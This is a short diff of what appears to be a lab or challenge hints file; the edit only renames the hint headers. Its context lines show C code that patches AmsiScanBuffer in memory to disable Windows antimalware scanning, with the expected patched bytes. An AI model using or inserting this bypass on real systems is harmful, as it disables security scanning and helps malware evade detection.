@@ -1,14 +1,14 @@
-=== HINT 1: Load AMSI and get function ===
+=== HINT 1 ===
 HMODULE amsi = LoadLibraryA("amsi.dll");
 BYTE *fn = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
 
-=== HINT 2: Unlock and patch ===
+=== HINT 2 ===
 DWORD old = 0;
 VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
 memcpy(fn, patch, sizeof(patch));
 VirtualProtect(fn, sizeof(patch), old, &old);
 
-=== HINT 3: Verify ===
+=== HINT 3 (SPOILER) ===
 print_bytes("after patch:", fn, 8);
 // Should show: B8 01 00 00 00 C3 ...
 
